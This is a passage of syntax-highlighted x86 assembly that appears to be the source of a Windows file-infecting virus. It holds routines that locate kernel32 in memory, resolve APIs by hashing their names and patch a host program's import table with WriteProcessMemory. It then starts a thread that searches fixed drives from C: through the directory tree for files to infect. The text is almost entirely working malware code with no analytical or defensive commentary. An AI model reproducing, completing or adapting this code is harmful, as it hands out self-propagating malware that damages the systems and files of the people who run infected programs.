         </span><span class="sc9">Import</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;Import is an address in Import table</span><span class="sc0">
                          </span><span class="sc1">;[ ]= adress of GlobalAlloc (in second generation)</span><span class="sc0">



</span><span class="sc1">;***** Search kernel32.dll address in memory</span><span class="sc0">
</span><span class="sc1">;      In :edx=address in kernel32</span><span class="sc0">
</span><span class="sc1">;***** Out:edx=kernel32.dll address</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

 </span><span class="sc6">Loop</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc3">"ZM"</span><span class="sc0">    
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc6">Loop</span><span class="sc0">

 </span><span class="sc5">MZ_found</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">; "MZ" found</span><span class="sc0">
                                             </span><span class="sc1">;is it the beginning of Kernel?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                           
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">03ch</span><span class="sc4">]</span><span class="sc0"> 
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 

        </span><span class="sc6">jg</span><span class="sc0"> </span><span class="sc6">Loop</span><span class="sc0">                                </span><span class="sc1">;this test avoid page fault</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc3">"EP"</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc6">Loop</span><span class="sc0"> 

</span><span class="sc1">;***** End of search kernel routine</span><span class="sc0">


</span><span class="sc1">;***** Search apis addresses needed </span><span class="sc0">
</span><span class="sc1">;      In : edx=IMAGE BASE of KERNEL32</span><span class="sc0">
</span><span class="sc1">;***** Out: Searched Apis addresses are put in a Table of Dword</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;eax=RVA of PE-header</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">;eax=Address of PE-header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;eax=RVA of EXPORT DIRECTORY section</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">;eax=Address of EXPORT DIRECTORY section</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;esi=RVA of the table containing pointers</span><span class="sc0">
  

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">;esi=Address of this table,</span><span class="sc0">
                               </span><span class="sc1">;a pointer to the name of the first </span><span class="sc0">
                               </span><span class="sc1">;exported function</span><span class="sc0">

        

        
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                            </span><span class="sc1">;ebx holds Api index</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ApiNb</span><span class="sc0">                          </span><span class="sc1">;number of Apis remaining</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> 
          
 </span><span class="sc5">MainLoop</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc1">;***** Crc computing of the current Api name</span><span class="sc0">
</span><span class="sc1">;      In : esi: RVA of name</span><span class="sc0">
</span><span class="sc1">;***** Out: Crc variable  contains the Crc of current name string</span><span class="sc0">

        
 </span><span class="sc5">ComputeCrc</span><span class="sc4">:</span><span class="sc0">
       
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

 </span><span class="sc5">Again</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">Lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">SeeU</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Again</span><span class="sc0"> 
    

 </span><span class="sc5">SeeU</span><span class="sc4">:</span><span class="sc0">
      

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Crc</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">


</span><span class="sc1">;***** End of crc computing routine</span><span class="sc0">



</span><span class="sc1">;***** Test Crc</span><span class="sc0">
</span><span class="sc1">;      In : Esi: Current Api name address</span><span class="sc0">
</span><span class="sc1">;      Out: Esi= following name</span><span class="sc0">
</span><span class="sc1">;***** Ecx= Api (pointer) index in the "table of names" </span><span class="sc0">


 </span><span class="sc5">TestCrc</span><span class="sc4">:</span><span class="sc0">
         

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Crc</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ApiNb</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">ApiList</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasd</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">MainLoop</span><span class="sc0">

        </span><span class="sc5">Found</span><span class="sc4">:</span><span class="sc0">
     
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ApiList</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;Api position</span><span class="sc0">
                                                      </span><span class="sc1">;in our table</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0"> 
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">  
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0"> 
        </span><span class="sc6">Loop</span><span class="sc0"> </span><span class="sc5">MainLoop</span><span class="sc0">
         
</span><span class="sc1">;***** End of crc test routine</span><span class="sc0">




</span><span class="sc1">;***** End of Apis searching routine</span><span class="sc0">

</span><span class="sc1">;routine: </span><span class="sc0">
</span><span class="sc1">;on copie les adresses que Windows a mis dans la table FT vers</span><span class="sc0">
</span><span class="sc1">;la vraie table qui commence … VA_FT</span><span class="sc0">



</span><span class="sc1">;We need to patch the import table of host.</span><span class="sc0">
</span><span class="sc1">;But first we need to compute the address of the Api we have replaced</span><span class="sc0">
</span><span class="sc1">;by GlobalAlloc</span><span class="sc0">




</span><span class="sc1">;[Compute address of hacked api]:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">ApiHack</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_GetProcAddress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ApiOriginalAdd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetCurrentProcessId</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OpenProcess</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">  
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">





        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VA_OFT</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

    
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">API_Buffer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
     

        

</span><span class="sc5">ALoop</span><span class="sc4">:</span><span class="sc0">

      
        </span><span class="sc6">lodsd</span><span class="sc0">                  
   
     
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">FollowMe</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">GetOut</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VA_API</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        
 
 
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ComputeAPI</span><span class="sc0">    
 
</span><span class="sc5">FollowMe</span><span class="sc4">:</span><span class="sc0">
  
 
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ImageBase</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">



        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 


</span><span class="sc5">ComputeAPI</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

 
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_GetProcAddress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
 

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 
        </span><span class="sc6">stosd</span><span class="sc0"> 
      
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ALoop</span><span class="sc0">
          
</span><span class="sc5">GetOut</span><span class="sc4">:</span><span class="sc0">


        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">API_Buffer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
     
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VA_FT</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

     
 
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WriteProcessMemory</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc1">;[Restore host hacked api]:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ApiOriginalAdd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">    </span><span class="sc1">;source</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">                        </span><span class="sc1">;push value</span><span class="sc0">
        </span><span class="sc5">HackAdd</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;destination </span><span class="sc0">
                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">Dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WriteProcessMemory</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">






 
 </span><span class="sc1">;[Create_Thread]:</span><span class="sc0">


 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">ThreadID</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">_Thread</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CreateThread</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc1">;[Go on API call]:</span><span class="sc0">
 

  </span><span class="sc6">popad</span><span class="sc0"> 
  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">       </span><span class="sc1">;jump [ ]</span><span class="sc0">
  </span><span class="sc5">JumpAway</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc5">_Thread</span><span class="sc4">:</span><span class="sc0">

 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DeltaOff</span><span class="sc0">
 </span><span class="sc5">DeltaOff</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DeltaOff</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">Miliseconds</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_Sleep</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc1">;[Save current directory]:</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DirExe</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">Dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetCurrentDirectoryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;***** Main routine (directory-tree search algorithm)</span><span class="sc0">
 


        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Counter</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc5">HowMany</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Depth</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> 


 
 </span><span class="sc5">SearchDisk</span><span class="sc4">:</span><span class="sc0">


 </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Key</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Key</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
 
 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
 </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0"> 

 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">  </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DiskName</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">


 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DiskName</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetDriveTypeA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">SearchDisk</span><span class="sc0">
 
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c7h</span><span class="sc4">,</span><span class="sc2">85h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileName</span><span class="sc0">
        </span><span class="sc5">DiskName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc13">":\",0 
</span><span class="sc0">

 </span><span class="sc5">Find0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Depth</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
